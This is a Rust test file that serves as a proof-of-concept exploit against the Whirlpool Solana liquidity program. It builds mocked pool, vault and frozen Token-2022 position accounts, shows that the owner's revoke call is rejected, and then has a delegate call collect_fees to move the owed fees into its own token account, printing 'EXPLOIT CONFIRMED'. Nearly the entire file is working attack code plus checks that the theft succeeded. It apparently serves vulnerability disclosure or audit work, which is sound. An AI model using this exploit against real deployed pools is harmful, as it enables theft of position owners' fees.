//! REAL RUNTIME PoC — delegate steals fees from a locked position.
//! Run: cargo test -p whirlpool --test real_attack -- --nocapture

use anchor_lang::prelude::*;
use anchor_lang::Discriminator;
use solana_program_test::*;
use solana_sdk::{
    account::Account,
    instruction::{AccountMeta, Instruction},
    program_pack::Pack,
    pubkey::Pubkey,
    signature::{Keypair, Signer},
    transaction::Transaction,
};
use spl_token_2022::{
    extension::ExtensionType,
    state::{Account as Token2022Account, AccountState},
    ID as TOKEN_2022_ID,
};

use whirlpool::state::{Position, Whirlpool};
use whirlpool::ID as WHIRLPOOL_ID;

const FEE_OWED: u64 = 1_000_000;

fn spl_account_data(mint: &Pubkey, owner: &Pubkey, amount: u64) -> Vec<u8> {
    let mut d = vec![0u8; spl_token::state::Account::LEN];
    spl_token::state::Account::pack(
        spl_token::state::Account {
            mint: *mint,
            owner: *owner,
            amount,
            delegate: solana_sdk::program_option::COption::None,
            state: spl_token::state::AccountState::Initialized,
            is_native: solana_sdk::program_option::COption::None,
            delegated_amount: 0,
            close_authority: solana_sdk::program_option::COption::None,
        },
        &mut d,
    )
    .unwrap();
    d
}

fn token2022_data(
    mint: &Pubkey, owner: &Pubkey, delegate: &Pubkey,
    amount: u64, delegated: u64, frozen: bool,
) -> Vec<u8> {
    let len = ExtensionType::try_calculate_account_len::<Token2022Account>(&[]).unwrap();
    let mut d = vec![0u8; len];
    Token2022Account::pack(
        Token2022Account {
            mint: *mint, owner: *owner, amount,
            delegate: solana_sdk::program_option::COption::Some(*delegate),
            state: if frozen { AccountState::Frozen } else { AccountState::Initialized },
            is_native: solana_sdk::program_option::COption::None,
            delegated_amount: delegated,
            close_authority: solana_sdk::program_option::COption::None,
        },
        &mut d,
    )
    .unwrap();
    d
}

fn ix_data(name: &str) -> Vec<u8> {
    use sha2::{Digest, Sha256};
    let mut h = Sha256::new();
    h.update(format!("global:{}", name).as_bytes());
    let out = h.finalize();
    out[0..8].to_vec()
}

fn build_position_bytes(whirlpool: &Pubkey, mint: &Pubkey, fee_a: u64) -> Vec<u8> {
    let mut d = Vec::with_capacity(216);
    d.extend_from_slice(Position::DISCRIMINATOR);
    d.extend_from_slice(whirlpool.as_ref());
    d.extend_from_slice(mint.as_ref());
    d.extend_from_slice(&0u128.to_le_bytes());
    d.extend_from_slice(&0i32.to_le_bytes());
    d.extend_from_slice(&1000i32.to_le_bytes());
    d.extend_from_slice(&0u128.to_le_bytes());
    d.extend_from_slice(&fee_a.to_le_bytes());
    d.extend_from_slice(&0u128.to_le_bytes());
    d.extend_from_slice(&0u64.to_le_bytes());
    for _ in 0..3 {
        d.extend_from_slice(&0u128.to_le_bytes());
        d.extend_from_slice(&0u64.to_le_bytes());
    }
    while d.len() < 216 { d.push(0); }
    d
}

fn build_whirlpool_bytes(
    mint_a: &Pubkey, mint_b: &Pubkey,
    vault_a: &Pubkey, vault_b: &Pubkey, tick_spacing: u16,
) -> Vec<u8> {
    let mut d = vec![0u8; Whirlpool::LEN];
    d[0..8].copy_from_slice(Whirlpool::DISCRIMINATOR);
    let put = |d: &mut Vec<u8>, off: usize, bytes: &[u8]| {
        d[off..off + bytes.len()].copy_from_slice(bytes);
    };
    put(&mut d, 41, &tick_spacing.to_le_bytes());
    put(&mut d, 99, mint_a.as_ref());
    put(&mut d, 131, vault_a.as_ref());
    put(&mut d, 179, mint_b.as_ref());
    put(&mut d, 211, vault_b.as_ref());
    d
}

#[tokio::test]
async fn delegate_steals_fees_from_locked_position() {
    let mut pt = ProgramTest::new("whirlpool", WHIRLPOOL_ID, processor!(whirlpool::entry));
    pt.prefer_bpf(false);

    let payer = Keypair::new();
    let owner = Keypair::new();
    let delegate = Keypair::new();

    pt.add_account(payer.pubkey(), Account {
        lamports: 100 * solana_sdk::native_token::LAMPORTS_PER_SOL,
        ..Default::default()
    });
    pt.add_account(owner.pubkey(), Account {
        lamports: 10 * solana_sdk::native_token::LAMPORTS_PER_SOL,
        ..Default::default()
    });
    pt.add_account(delegate.pubkey(), Account {
        lamports: 10 * solana_sdk::native_token::LAMPORTS_PER_SOL,
        ..Default::default()
    });

    let position_mint = Pubkey::new_unique();
    let whirlpool_key = Pubkey::new_unique();
    let mint_a = Pubkey::new_unique();
    let mint_b = Pubkey::new_unique();
    let vault_a = Pubkey::new_unique();
    let vault_b = Pubkey::new_unique();
    let position_key = Pubkey::new_unique();
    let position_ta = Pubkey::new_unique();
    let delegate_ata = Pubkey::new_unique();

    pt.add_account(position_ta, Account {
        lamports: 10_000_000,
        data: token2022_data(&position_mint, &owner.pubkey(), &delegate.pubkey(), 1, 1, true),
        owner: TOKEN_2022_ID,
        executable: false,
        rent_epoch: 0,
    });

    pt.add_account(whirlpool_key, Account {
        lamports: 100_000_000,
        data: build_whirlpool_bytes(&mint_a, &mint_b, &vault_a, &vault_b, 64),
        owner: WHIRLPOOL_ID,
        executable: false,
        rent_epoch: 0,
    });

    pt.add_account(vault_a, Account {
        lamports: 10_000_000,
        data: spl_account_data(&mint_a, &whirlpool_key, FEE_OWED * 2),
        owner: spl_token::ID,
        executable: false,
        rent_epoch: 0,
    });
    pt.add_account(vault_b, Account {
        lamports: 10_000_000,
        data: spl_account_data(&mint_b, &whirlpool_key, 0),
        owner: spl_token::ID,
        executable: false,
        rent_epoch: 0,
    });

    pt.add_account(position_key, Account {
        lamports: 50_000_000,
        data: build_position_bytes(&whirlpool_key, &position_mint, FEE_OWED),
        owner: WHIRLPOOL_ID,
        executable: false,
        rent_epoch: 0,
    });

    pt.add_account(delegate_ata, Account {
        lamports: 10_000_000,
        data: spl_account_data(&mint_a, &delegate.pubkey(), 0),
        owner: spl_token::ID,
        executable: false,
        rent_epoch: 0,
    });

    let (mut banks_client, recent_blockhash, _) = pt.start().await;

    // STEP 1 — revoke must fail on frozen account
    let revoke_ix = spl_token_2022::instruction::revoke(
        &TOKEN_2022_ID, &position_ta, &owner.pubkey(), &[],
    ).unwrap();
    let tx = Transaction::new_signed_with_payer(
        &[revoke_ix], Some(&payer.pubkey()), &[&payer, &owner], recent_blockhash,
    );
    match banks_client.process_transaction(tx).await {
        Ok(_) => panic!("revoke should have failed"),
        Err(e) => println!("\n[STEP 1 OK] revoke rejected: {:?}\n", e),
    }

    // STEP 2 — delegate calls collect_fees with its own ATA
    let collect_ix = Instruction {
        program_id: WHIRLPOOL_ID,
        accounts: vec![
            AccountMeta::new_readonly(whirlpool_key, false),
            AccountMeta::new_readonly(delegate.pubkey(), true),
            AccountMeta::new(position_key, false),
            AccountMeta::new_readonly(position_ta, false),
            AccountMeta::new(delegate_ata, false),
            AccountMeta::new(vault_a, false),
            AccountMeta::new(delegate_ata, false),
            AccountMeta::new(vault_b, false),
            AccountMeta::new_readonly(spl_token::ID, false),
        ],
        data: ix_data("collect_fees"),
    };
    let tx = Transaction::new_signed_with_payer(
        &[collect_ix], Some(&payer.pubkey()), &[&payer, &delegate], recent_blockhash,
    );
    match banks_client.process_transaction(tx).await {
        Ok(_) => println!("\n[STEP 2 OK] collect_fees succeeded\n"),
        Err(e) => {
            println!("\n[STEP 2 FAIL] {:?}\n", e);
            panic!("collect_fees failed");
        }
    }

    // STEP 3 — verify balances moved
    let ata_after = banks_client.get_account(delegate_ata).await.unwrap().unwrap();
    let ata_state = spl_token::state::Account::unpack(&ata_after.data).unwrap();
    let vault_after = banks_client.get_account(vault_a).await.unwrap().unwrap();
    let vault_state = spl_token::state::Account::unpack(&vault_after.data).unwrap();

    println!("\n══════════════════════════════════════");
    println!("   EXPLOIT CONFIRMED");
    println!("   delegate ATA:  {}", ata_state.amount);
    println!("   vault_a:       {}", vault_state.amount);
    println!("══════════════════════════════════════\n");

    assert_eq!(ata_state.amount, FEE_OWED);
    assert_eq!(vault_state.amount, FEE_OWED);
}
